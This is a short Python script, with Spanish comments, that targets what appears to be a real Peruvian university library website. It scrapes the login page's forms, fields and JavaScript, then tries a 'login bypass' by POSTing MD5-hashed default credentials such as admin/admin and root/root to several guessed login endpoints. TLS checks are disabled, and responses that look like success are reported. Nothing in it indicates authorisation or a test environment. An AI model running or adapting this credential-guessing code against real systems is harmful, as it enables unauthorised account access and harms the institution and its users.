import requests, urllib3, re, hashlib
urllib3.disable_warnings()
BASE = "https://biblioteca.uns.edu.pe"
h = {"User-Agent": "Mozilla/5.0"}

r = requests.get(BASE + "/inicia_sesion.asp", headers=h, verify=False, timeout=10, allow_redirects=True)
src = r.text

# Extraer form action y campos
forms = re.findall(r'<form[^>]+>', src, re.I)
print("=== FORMS ===")
for f in forms:
    print(f"  {f}")

actions = re.findall(r'action=["\']([^"\']+)["\']', src, re.I)
print(f"\nActions: {actions}")

inputs = re.findall(r'<input[^>]+>', src, re.I)
print("\n=== INPUTS ===")
for i in inputs:
    print(f"  {i}")

# Extraer todo el JS
print("\n=== JAVASCRIPT COMPLETO ===")
scripts = re.findall(r'<SCRIPT[^>]*>(.*?)</SCRIPT>', src, re.I | re.S)
for sc in scripts:
    if len(sc.strip()) > 10:
        print(sc[:800])
        print("---")

# Probar login bypass - POST directo sin JS validation
print("\n=== TEST: Login bypass (POST directo sin JS) ===")
# La password va como MD5 segun el JS: hex_md5(password)
# Probamos con MD5 de passwords comunes
test_creds = [
    ("admin",    "admin"),
    ("admin",    "123456"),
    ("admin",    "biblioteca"),
    ("admin",    "uns"),
    ("admin",    ""),
    ("biblio",   "biblio"),
    ("biblio",   "biblioteca"),
    ("usuario",  "usuario"),
    ("root",     "root"),
    ("library",  "library"),
]

# El form envia MD5 del password
for user, pwd in test_creds:
    md5_pwd = hashlib.md5(pwd.encode()).hexdigest() if pwd else ""
    
    # Necesitamos el action del form - intentar con nombres comunes
    for action in ["/valida_login.asp", "/login.asp", "/procesa_login.asp",
                   "/inicia_sesion.asp", "/autenticar.asp", "/verifica.asp"]:
        try:
            resp = requests.post(
                BASE + action,
                data={"t_usuario": user, "t_clave": md5_pwd},
                headers={**h, "Referer": BASE + "/inicia_sesion.asp",
                          "Content-Type": "application/x-www-form-urlencoded"},
                verify=False, timeout=8, allow_redirects=False
            )
            if resp.status_code not in (404, 500) and len(resp.content) > 100:
                print(f"  [!] {action} -> HTTP {resp.status_code} | {len(resp.content)}b | user={user} pwd={pwd}")
                if resp.headers.get("Location"):
                    print(f"      Redirect: {resp.headers['Location']}")
        except:
            pass
